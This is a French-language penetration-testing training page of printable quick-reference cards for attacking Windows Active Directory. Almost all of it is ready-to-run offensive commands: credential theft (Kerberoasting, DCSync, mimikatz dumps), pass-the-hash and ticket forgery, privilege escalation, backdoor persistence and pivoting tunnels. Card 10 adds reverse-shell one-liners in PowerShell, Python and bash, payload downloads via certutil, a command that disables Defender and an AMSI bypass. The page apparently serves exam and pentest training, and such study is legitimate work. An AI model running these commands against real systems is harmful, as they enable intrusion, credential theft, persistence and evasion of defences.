---
tags:
  - formation
  - security
  - cheatsheet
  - quick-reference
  - exam
---

# Quick Reference Cards

Fiches condensées pour utilisation rapide en exam ou sur le terrain. Imprimables en format A4.

---

## Card 1: Enumeration AD

```
┌─────────────────────────────────────────────────────────────────┐
│                    AD ENUMERATION QUICK REF                      │
├─────────────────────────────────────────────────────────────────┤
│ ANONYMOUS                                                        │
│ ─────────────────────────────────────────────────────────────── │
│ nmap -p 389,636,3268 -sV <DC>                                   │
│ ldapsearch -x -H ldap://<DC> -s base namingcontexts             │
│ rpcclient -U "" -N <DC>                                         │
│ enum4linux -a <DC>                                              │
│                                                                  │
│ AUTHENTICATED                                                    │
│ ─────────────────────────────────────────────────────────────── │
│ # BloodHound                                                     │
│ bloodhound-python -u user -p pass -d domain -c All -ns <DC>     │
│                                                                  │
│ # PowerView                                                      │
│ Get-DomainUser -SPN                    # Kerberoastable         │
│ Get-DomainUser -PreauthNotRequired     # AS-REP Roastable       │
│ Get-DomainComputer -Unconstrained      # Unconstrained Deleg    │
│ Find-InterestingDomainAcl              # Weak ACLs              │
│ Get-DomainGPO | Get-ObjectAcl          # GPO permissions        │
│                                                                  │
│ # CrackMapExec                                                   │
│ cme smb <DC> -u user -p pass --users                            │
│ cme smb <DC> -u user -p pass --shares                           │
│ cme smb <DC> -u user -p pass -M spider_plus                     │
│                                                                  │
│ BLOODHOUND QUERIES                                               │
│ ─────────────────────────────────────────────────────────────── │
│ MATCH (n:User {hasspn:true}) RETURN n          # Kerberoastable │
│ MATCH (n:User {dontreqpreauth:true}) RETURN n  # AS-REP         │
│ MATCH p=shortestPath((a)-[*1..]->(b:Group {name:"DOMAIN ADMINS@│
│   DOMAIN.LOCAL"})) RETURN p                                      │
└─────────────────────────────────────────────────────────────────┘
```

---

## Card 2: Credential Attacks

```
┌─────────────────────────────────────────────────────────────────┐
│                   CREDENTIAL ATTACKS QUICK REF                   │
├─────────────────────────────────────────────────────────────────┤
│ KERBEROASTING                                                    │
│ ─────────────────────────────────────────────────────────────── │
│ impacket-GetUserSPNs -request -dc-ip <DC> domain/user:pass      │
│ Rubeus.exe kerberoast /nowrap                                   │
│ hashcat -m 13100 hashes.txt wordlist.txt                        │
│                                                                  │
│ AS-REP ROASTING                                                  │
│ ─────────────────────────────────────────────────────────────── │
│ impacket-GetNPUsers -dc-ip <DC> domain/ -usersfile users.txt    │
│ Rubeus.exe asreproast /nowrap                                   │
│ hashcat -m 18200 hashes.txt wordlist.txt                        │
│                                                                  │
│ PASSWORD SPRAYING                                                │
│ ─────────────────────────────────────────────────────────────── │
│ cme smb <DC> -u users.txt -p 'Password123' --continue-on-success│
│ kerbrute passwordspray -d domain users.txt 'Password123'        │
│                                                                  │
│ RESPONDER                                                        │
│ ─────────────────────────────────────────────────────────────── │
│ responder -I eth0 -dwv                                          │
│ hashcat -m 5600 hashes.txt wordlist.txt     # NTLMv2            │
│                                                                  │
│ NTLM RELAY                                                       │
│ ─────────────────────────────────────────────────────────────── │
│ impacket-ntlmrelayx -tf targets.txt -smb2support                │
│ impacket-ntlmrelayx -t ldap://<DC> --escalate-user user         │
│                                                                  │
│ DCSYNC                                                           │
│ ─────────────────────────────────────────────────────────────── │
│ impacket-secretsdump domain/admin:pass@<DC>                     │
│ mimikatz# lsadump::dcsync /domain:domain /user:krbtgt           │
└─────────────────────────────────────────────────────────────────┘
```

---

## Card 3: Lateral Movement

```
┌─────────────────────────────────────────────────────────────────┐
│                  LATERAL MOVEMENT QUICK REF                      │
├─────────────────────────────────────────────────────────────────┤
│ PASS-THE-HASH                                                    │
│ ─────────────────────────────────────────────────────────────── │
│ impacket-psexec -hashes :NTHASH domain/user@target              │
│ impacket-wmiexec -hashes :NTHASH domain/user@target             │
│ cme smb target -u user -H NTHASH -x "whoami"                    │
│ evil-winrm -i target -u user -H NTHASH                          │
│                                                                  │
│ PASS-THE-TICKET                                                  │
│ ─────────────────────────────────────────────────────────────── │
│ export KRB5CCNAME=/path/to/ticket.ccache                        │
│ impacket-psexec -k -no-pass domain/user@target                  │
│ Rubeus.exe ptt /ticket:base64ticket                             │
│                                                                  │
│ OVERPASS-THE-HASH                                                │
│ ─────────────────────────────────────────────────────────────── │
│ impacket-getTGT -hashes :NTHASH domain/user                     │
│ Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt                   │
│                                                                  │
│ WINRM (5985/5986)                                                │
│ ─────────────────────────────────────────────────────────────── │
│ evil-winrm -i target -u user -p pass                            │
│ Enter-PSSession -ComputerName target -Credential $cred          │
│                                                                  │
│ RDP (3389)                                                       │
│ ─────────────────────────────────────────────────────────────── │
│ xfreerdp /v:target /u:user /p:pass /cert:ignore                 │
│ rdesktop -u user -p pass target                                 │
│                                                                  │
│ DCOM                                                             │
│ ─────────────────────────────────────────────────────────────── │
│ impacket-dcomexec domain/user:pass@target                       │
└─────────────────────────────────────────────────────────────────┘
```

---

## Card 4: Privilege Escalation Windows

```
┌─────────────────────────────────────────────────────────────────┐
│                 WINDOWS PRIVESC QUICK REF                        │
├─────────────────────────────────────────────────────────────────┤
│ ENUMERATION                                                      │
│ ─────────────────────────────────────────────────────────────── │
│ winPEAS.exe                                                     │
│ PowerUp.ps1 -> Invoke-AllChecks                                 │
│ Seatbelt.exe -group=all                                         │
│ whoami /priv                                                    │
│                                                                  │
│ SERVICE EXPLOITS                                                 │
│ ─────────────────────────────────────────────────────────────── │
│ # Unquoted Service Path                                          │
│ wmic service get name,pathname | findstr /i /v "C:\Windows"     │
│ sc qc ServiceName                                               │
│ # Place exe in writable path segment                            │
│                                                                  │
│ # Weak Service Permissions                                       │
│ accesschk.exe -uwcqv "Users" *                                  │
│ sc config ServiceName binpath="C:\shell.exe"                    │
│                                                                  │
│ POTATO ATTACKS (SeImpersonate)                                   │
│ ─────────────────────────────────────────────────────────────── │
│ PrintSpoofer.exe -c "C:\shell.exe"                              │
│ GodPotato.exe -cmd "C:\shell.exe"                               │
│ JuicyPotato.exe -l 1337 -p C:\shell.exe -t *                    │
│                                                                  │
│ TOKEN MANIPULATION                                               │
│ ─────────────────────────────────────────────────────────────── │
│ incognito.exe list_tokens -u                                    │
│ incognito.exe execute -c "DOMAIN\Admin" cmd.exe                 │
│                                                                  │
│ CREDENTIALS                                                      │
│ ─────────────────────────────────────────────────────────────── │
│ mimikatz# sekurlsa::logonpasswords                              │
│ mimikatz# lsadump::sam                                          │
│ reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM sys.bak       │
└─────────────────────────────────────────────────────────────────┘
```

---

## Card 5: Kerberos Attacks

```
┌─────────────────────────────────────────────────────────────────┐
│                   KERBEROS ATTACKS QUICK REF                     │
├─────────────────────────────────────────────────────────────────┤
│ GOLDEN TICKET                                                    │
│ ─────────────────────────────────────────────────────────────── │
│ # Requires: krbtgt NTLM hash + Domain SID                        │
│ mimikatz# kerberos::golden /user:fakeadmin /domain:domain.local │
│   /sid:S-1-5-21-... /krbtgt:HASH /ptt                           │
│                                                                  │
│ impacket-ticketer -nthash HASH -domain-sid S-1-5-21-...         │
│   -domain domain.local fakeadmin                                │
│                                                                  │
│ SILVER TICKET                                                    │
│ ─────────────────────────────────────────────────────────────── │
│ # Requires: Service account NTLM hash + SPN                      │
│ mimikatz# kerberos::golden /user:user /domain:domain.local      │
│   /sid:S-1-5-21-... /target:server /service:cifs /rc4:HASH /ptt │
│                                                                  │
│ DELEGATION ATTACKS                                               │
│ ─────────────────────────────────────────────────────────────── │
│ # Unconstrained                                                  │
│ Rubeus.exe monitor /interval:5     # Wait for TGT               │
│                                                                  │
│ # Constrained (S4U)                                              │
│ Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:admin       │
│   /msdsspn:cifs/target /ptt                                     │
│                                                                  │
│ # RBCD                                                           │
│ # 1. Add computer account                                        │
│ impacket-addcomputer -computer-name 'FAKE$' -computer-pass pass │
│ # 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity                │
│ # 3. S4U attack                                                  │
│ impacket-getST -spn cifs/target -impersonate admin              │
│   domain/'FAKE$':pass                                           │
│                                                                  │
│ ADCS (CERTIFICATE ATTACKS)                                       │
│ ─────────────────────────────────────────────────────────────── │
│ certipy find -u user -p pass -dc-ip DC                          │
│ certipy req -u user -p pass -target CA -template Vuln -upn admin│
│ certipy auth -pfx admin.pfx -dc-ip DC                           │
└─────────────────────────────────────────────────────────────────┘
```

---

## Card 6: Persistence

```
┌─────────────────────────────────────────────────────────────────┐
│                    PERSISTENCE QUICK REF                         │
├─────────────────────────────────────────────────────────────────┤
│ SCHEDULED TASK                                                   │
│ ─────────────────────────────────────────────────────────────── │
│ schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon │
│ schtasks /create /tn "Update" /tr "..." /sc daily /st 09:00     │
│                                                                  │
│ REGISTRY                                                         │
│ ─────────────────────────────────────────────────────────────── │
│ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run      │
│   /v Update /d "C:\backdoor.exe"                                │
│ reg add HKLM\...\Run /v Update /d "..."    # Requires admin     │
│                                                                  │
│ SERVICE                                                          │
│ ─────────────────────────────────────────────────────────────── │
│ sc create ServiceName binpath="C:\backdoor.exe" start=auto      │
│ sc start ServiceName                                            │
│                                                                  │
│ WMI EVENT                                                        │
│ ─────────────────────────────────────────────────────────────── │
│ # Trigger on startup, process start, etc.                        │
│ wmic /namespace:\\root\subscription PATH __EventFilter          │
│   CREATE Name="filter", Query="SELECT * FROM..."                │
│                                                                  │
│ STARTUP FOLDER                                                   │
│ ─────────────────────────────────────────────────────────────── │
│ copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\      │
│   Programs\Startup\"                                            │
│                                                                  │
│ DOMAIN PERSISTENCE                                               │
│ ─────────────────────────────────────────────────────────────── │
│ # Golden Ticket - Requires krbtgt hash                           │
│ # AdminSDHolder - ACL propagation every 60min                    │
│ # DSRM - DC recovery account                                     │
│ # Skeleton Key - Universal password on DC                        │
│ mimikatz# misc::skeleton     # Password: mimikatz               │
└─────────────────────────────────────────────────────────────────┘
```

---

## Card 7: Pivoting

```
┌─────────────────────────────────────────────────────────────────┐
│                     PIVOTING QUICK REF                           │
├─────────────────────────────────────────────────────────────────┤
│ SSH                                                              │
│ ─────────────────────────────────────────────────────────────── │
│ # SOCKS Proxy                                                    │
│ ssh -D 9050 user@pivot                                          │
│ proxychains nmap -sT -Pn target                                 │
│                                                                  │
│ # Local Port Forward                                             │
│ ssh -L 3389:internal:3389 user@pivot                            │
│ rdesktop localhost:3389                                         │
│                                                                  │
│ # Remote Port Forward                                            │
│ ssh -R 4444:localhost:4444 user@pivot                           │
│                                                                  │
│ CHISEL                                                           │
│ ─────────────────────────────────────────────────────────────── │
│ # Attacker (server)                                              │
│ ./chisel server -p 8080 --reverse                               │
│                                                                  │
│ # Target (client)                                                │
│ chisel.exe client ATTACKER:8080 R:socks                         │
│ chisel.exe client ATTACKER:8080 R:3389:DC:3389                  │
│                                                                  │
│ LIGOLO-NG                                                        │
│ ─────────────────────────────────────────────────────────────── │
│ # Setup                                                          │
│ sudo ip tuntap add user $USER mode tun ligolo                   │
│ sudo ip link set ligolo up                                      │
│ ./proxy -selfcert -laddr 0.0.0.0:11601                          │
│                                                                  │
│ # Target                                                         │
│ agent.exe -connect ATTACKER:11601 -ignore-cert                  │
│                                                                  │
│ # Route (after agent connects)                                   │
│ sudo ip route add 10.0.0.0/24 dev ligolo                        │
│                                                                  │
│ METASPLOIT                                                       │
│ ─────────────────────────────────────────────────────────────── │
│ run autoroute -s 10.0.0.0/24                                    │
│ use auxiliary/server/socks_proxy                                │
└─────────────────────────────────────────────────────────────────┘
```

---

## Card 8: Port Reference

```
┌─────────────────────────────────────────────────────────────────┐
│                      PORT REFERENCE                              │
├─────────────────────────────────────────────────────────────────┤
│ WINDOWS / AD                                                     │
│ ─────────────────────────────────────────────────────────────── │
│  21   FTP          │  Fichiers, credentials                     │
│  22   SSH          │  Linux, rare sur Windows                   │
│  23   Telnet       │  Legacy, cleartext                         │
│  53   DNS          │  Zone transfers, AD DNS                    │
│  88   Kerberos     │  Authentication                            │
│ 135   RPC          │  MSRPC, WMI                                │
│ 139   NetBIOS      │  Legacy, souvent avec 445                  │
│ 389   LDAP         │  AD queries                                │
│ 445   SMB          │  Shares, PsExec, relay                     │
│ 464   Kpasswd      │  Password change                           │
│ 593   HTTP-RPC     │  RPC over HTTP                             │
│ 636   LDAPS        │  Secure LDAP                               │
│ 1433  MSSQL        │  Database, xp_cmdshell                     │
│ 3268  GC           │  Global Catalog                            │
│ 3269  GC-SSL       │  Global Catalog Secure                     │
│ 3389  RDP          │  Remote Desktop                            │
│ 5985  WinRM-HTTP   │  PowerShell Remoting                       │
│ 5986  WinRM-HTTPS  │  PowerShell Remoting Secure                │
│ 9389  ADWS         │  AD Web Services                           │
│                                                                  │
│ WEB                                                              │
│ ─────────────────────────────────────────────────────────────── │
│  80   HTTP         │  Web apps                                  │
│ 443   HTTPS        │  Secure web                                │
│ 8080  HTTP-Alt     │  Proxy, alt web                            │
│ 8443  HTTPS-Alt    │  Alt secure web                            │
│                                                                  │
│ COMMON SERVICES                                                  │
│ ─────────────────────────────────────────────────────────────── │
│ 111   NFS          │  Network File System                       │
│ 161   SNMP         │  Community strings                         │
│ 512-514 R-Services │  rexec, rlogin, rsh                        │
│ 2049  NFS          │  File shares                               │
│ 6379  Redis        │  Often unauthenticated                     │
│ 27017 MongoDB      │  NoSQL database                            │
└─────────────────────────────────────────────────────────────────┘
```

---

## Card 9: Hashcat Modes

```
┌─────────────────────────────────────────────────────────────────┐
│                    HASHCAT MODES QUICK REF                       │
├─────────────────────────────────────────────────────────────────┤
│ WINDOWS                                                          │
│ ─────────────────────────────────────────────────────────────── │
│ 1000   NTLM                                                     │
│ 3000   LM                                                       │
│ 5600   NTLMv2                                                   │
│ 2100   DCC2 (Domain Cached Credentials)                         │
│                                                                  │
│ KERBEROS                                                         │
│ ─────────────────────────────────────────────────────────────── │
│ 13100  TGS-REP (RC4)      # Kerberoasting                       │
│ 18200  AS-REP (RC4)       # AS-REP Roasting                     │
│ 19600  TGS-REP (AES128)                                         │
│ 19700  TGS-REP (AES256)                                         │
│                                                                  │
│ COMMON                                                           │
│ ─────────────────────────────────────────────────────────────── │
│    0   MD5                                                      │
│  100   SHA1                                                     │
│ 1400   SHA256                                                   │
│ 1800   sha512crypt (Linux)                                      │
│ 3200   bcrypt                                                   │
│ 500    MD5crypt (Linux)                                         │
│ 7400   sha256crypt (Linux)                                      │
│                                                                  │
│ COMMAND                                                          │
│ ─────────────────────────────────────────────────────────────── │
│ hashcat -m MODE hash.txt wordlist.txt                           │
│ hashcat -m MODE hash.txt wordlist.txt -r best64.rule            │
│ hashcat -m MODE hash.txt -a 3 ?u?l?l?l?l?l?d?d                  │
│ hashcat -m MODE hash.txt --show                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Card 10: One-Liners

```
┌─────────────────────────────────────────────────────────────────┐
│                     ONE-LINERS QUICK REF                         │
├─────────────────────────────────────────────────────────────────┤
│ REVERSE SHELLS                                                   │
│ ─────────────────────────────────────────────────────────────── │
│ # PowerShell                                                     │
│ powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',   │
│ PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=     │
│ $s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName          │
│ System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|  │
│ Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]:: │
│ ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"               │
│                                                                  │
│ # Python                                                         │
│ python -c 'import socket,subprocess,os;s=socket.socket();       │
│ s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),│
│ 1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'     │
│                                                                  │
│ # Bash                                                           │
│ bash -i >& /dev/tcp/IP/PORT 0>&1                                │
│                                                                  │
│ FILE TRANSFER                                                    │
│ ─────────────────────────────────────────────────────────────── │
│ # Python server                                                  │
│ python3 -m http.server 80                                       │
│                                                                  │
│ # PowerShell download                                            │
│ iwr http://IP/file -outfile file                                │
│ certutil -urlcache -split -f http://IP/file file                │
│                                                                  │
│ # Linux download                                                 │
│ curl http://IP/file -o file                                     │
│ wget http://IP/file                                             │
│                                                                  │
│ QUICK WINS                                                       │
│ ─────────────────────────────────────────────────────────────── │
│ # Check if admin                                                 │
│ net localgroup administrators                                   │
│ whoami /groups | findstr /i admin                               │
│                                                                  │
│ # Disable Defender (requires admin)                              │
│ Set-MpPreference -DisableRealtimeMonitoring $true               │
│                                                                  │
│ # AMSI Bypass                                                    │
│ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')│
│ .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,1)│
└─────────────────────────────────────────────────────────────────┘
```

---

## Impression

Ces fiches sont optimisées pour impression A4. Pour imprimer :

1. Copier le contenu de la fiche souhaitée
2. Coller dans un éditeur de texte (police monospace)
3. Ajuster la taille de police (8-10pt recommandé)
4. Imprimer en mode paysage pour les fiches larges

---

[Retour au Programme](index.md){ .md-button }
[Cheatsheet Tools →](cheatsheet-tools.md){ .md-button .md-button--primary }
